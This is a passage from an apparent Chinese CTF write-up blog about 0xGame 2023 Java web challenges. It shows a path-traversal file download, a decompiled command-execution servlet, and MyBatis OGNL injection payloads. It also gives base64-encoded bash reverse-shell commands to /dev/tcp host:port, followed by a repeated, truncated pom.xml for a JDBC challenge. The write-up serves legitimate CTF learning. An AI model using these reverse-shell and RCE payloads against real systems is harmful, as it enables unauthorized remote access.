class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>根据网上文章的知识点, 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径</p><p>要获取到这个类的文件，filename访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>download?filename=%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/WEB-INF/</span>classes<span class="hljs-regexp">/com/</span>example<span class="hljs-regexp">/demo/</span>EvilServlet.class<br></code></pre></td></tr></table></figure><p>下载得到了_WEB-INF_classes_com_example_demo_EvilServlet.class文件，在线反编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;Evil_Cmd_Arguments_fe37627fed78&quot;</span>);<br><br>      <span class="hljs-keyword">try</span> &#123;<br>         Runtime.getRuntime().exec(cmd);<br>         resp.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;<br>         resp.getWriter().write(<span class="hljs-string">&quot;error&quot;</span>);<br>      &#125;<br><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到有命令执行，最后因为没有回显,那么我们直接post传参反弹shell即可</p><p>传入 Runtime.exec 的命令需要进行一次编码</p><p><a href="https://www.adminxe.com/tools/code.html">https://www.adminxe.com/tools/code.html</a></p><p>具体原因</p><p><a href="https://www.anquanke.com/post/id/243329">https://www.anquanke.com/post/id/243329</a></p><p><a href="https://y4er.com/posts/java-exec-command/">https://y4er.com/posts/java-exec-command/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>+-c+&#123;echo,bash -i &gt;&amp; /dev/tcp/host.docker.internal/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>对</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><p>进行base64加密,然后POST再用hackbar进行url加密</p><p><img src="/2023/10/22/0xGameCTF2023/image-20231107151544931.png" alt="image-20231107151544931"></p><p>反弹成功</p><p><img src="/2023/10/22/0xGameCTF2023/image-20231107151646724.png" alt="image-20231107151646724"></p><h3 id="YourBatis"><a href="#YourBatis" class="headerlink" title="YourBatis"></a>YourBatis</h3><p>考点: MyBatis 低版本 OGNL 注入</p><blockquote><p>Hint 1: 关注题目名称&#x2F;描述 以及 pom.xml 中的依赖</p><p>Hint 2: SQL 注入不是考点 题目需要 RCE</p><p>Hint 3: MyBatis RCE 尝试结合网上的文章构造 Payload</p><p>Hint 4: 注意反编译 jar 包的时候请不要使用 jd-gui 尝试使用 jadx-gui 或 IDEA</p><p>Hint 5: 你可能会用到的网站: <a href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p><p>Hint 6: 在进行 RCE 的时候 因为 OGNL 的解析问题 所以最终传入 Runtime.exec() 的命令内不得包含 { 和 } 可以尝试编码绕过</p></blockquote><p>这有⼀个⼩坑, 如果 jar 包使⽤ JD-GUI 反编译的话就⽆法正常得到 UserSqlProvider 这个类的内容, 必须得使⽤</p><p>IDEA ⾃带的反编译器或者 Jadx-GUI 等其它⼯具才⾏</p><p>利用idea的反编译命令，在编译之前创建好out目录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java -cp <span class="hljs-string">&quot;D:\Idea\IntelliJ IDEA 2023.2.3\plugins\java-decompiler\lib\java-decompiler.jar&quot;</span> org<span class="hljs-selector-class">.jetbrains</span><span class="hljs-selector-class">.java</span><span class="hljs-selector-class">.decompiler</span><span class="hljs-selector-class">.main</span><span class="hljs-selector-class">.decompiler</span><span class="hljs-selector-class">.ConsoleDecompiler</span> -dgs=true <span class="hljs-string">&quot;E:\CTF\Competition\0xGame2023\YourBatis\YourBatis\YourBatis.jar&quot;</span> <span class="hljs-string">&quot;E:\CTF\Competition\0xGame2023\YourBatis\YourBatis\out&quot;</span><br></code></pre></td></tr></table></figure><p>反编译完之后还是jar包，将jar包解压</p><p>得到一系列文件，找到pom.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>存在 mybatis 依赖, 版本 2.1.1, 该版本存在 OGNL 表达式注入, 网上搜搜就有相关的利用文章</p><p><a href="https://www.cnpanda.net/sec/1227.html">https://www.cnpanda.net/sec/1227.html</a></p><p><a href="https://forum.butian.net/share/1749">https://forum.butian.net/share/1749</a></p><p>MyBatis 默认是支持OGNL 表达式的，尤其是在动态SQL中，通过OGNL 表达式可以灵活的组装 SQL 语句，从而完成更多的功能。在特定的情况下可能会存在RCE的风险。</p><p>找到了UserSqlProvider.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">apackage com.example.yourbatis.provider;<br><br><span class="hljs-keyword">import</span> org.apache.ibatis.jdbc.SQL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSqlProvider</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUsers</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>         &#123;<br>            <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);<br>            <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);<br>         &#125;<br>      &#125;).toString();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUserByUsername</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String username)</span> &#123;<br>      <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>         &#123;<br>            <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);<br>            <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);<br>            <span class="hljs-built_in">this</span>.WHERE(String.format(<span class="hljs-string">&quot;username = &#x27;%s&#x27;&quot;</span>, username));<br>         &#125;<br>      &#125;).toString();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据参考文章可以知道这里的 username 被直接拼接进 SQL 语句, 存在 SQL 注入, 但是更进一步来讲这里存在 OGNL 表达式注入</p><p>直接反弹 shell</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-variable">@java</span>.lang.<span class="hljs-title class_">Runtime</span><span class="hljs-variable">@getRuntime</span>().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>但是很显然是会失败的, 因为传入的命令包含了 <code>&#123;</code> 和 <code>&#125;</code>, 会被递归解析为另一个 OGNL 表达式的开头和结尾</p><p>解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$&#123;</span><span class="hljs-variable">@java</span>.lang.<span class="hljs-title class_">Runtime</span><span class="hljs-variable">@getRuntime</span>().exec(new java.lang.<span class="hljs-title class_">String</span>(<span class="hljs-variable">@java</span>.util.<span class="hljs-title class_">Base64</span><span class="hljs-variable">@getDecoder</span>().decode(<span class="hljs-string">&#x27;YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzlvYjNOMExtUnZZMnRsY2k1cGJuUmxjbTVoYkM4ME5EUTBJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9Cg==&#x27;</span>)))&#125;<br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/tcp</span><span class="hljs-regexp">/ip/port</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> base64后填入下方<span class="hljs-string">??</span><span class="hljs-string">??</span>处<br>bash -c &#123;echo,<span class="hljs-string">??</span><span class="hljs-string">??</span>&#125;|<span class="hljs-params">&#123;base64,-d&#125;</span>|&#123;bash,-i&#125;<br>然后再整个base64<br></code></pre></td></tr></table></figure><p>urlencode 全部字符后发送, 反弹 shell, 查看环境变量拿到 flag</p><p><img src="/2023/10/22/0xGameCTF2023/1699355216493.png" alt="1699355216493"></p><h3 id="TestConnection"><a href="#TestConnection" class="headerlink" title="TestConnection"></a>TestConnection</h3><blockquote><p>Hint 1: JDBC 会不会存在一些漏洞?</p><p>Hint 2: MySQL &#x2F; PostgreSQL Jdbc Attack</p><p>Hint 3: 你可能会用到的网站: <a href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p></blockquote><!--JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问JDBC URL 就是用于连接数据库的字符串, 格式为 `jdbc:db-type://host:port/db-name?param=value`db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlitedb-name 是要使用的数据库名param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE--><p>拿到题目首先把jar包反编译</p><p>查看pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>TestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>TestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>TestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>42.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>TestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>TestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>TestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        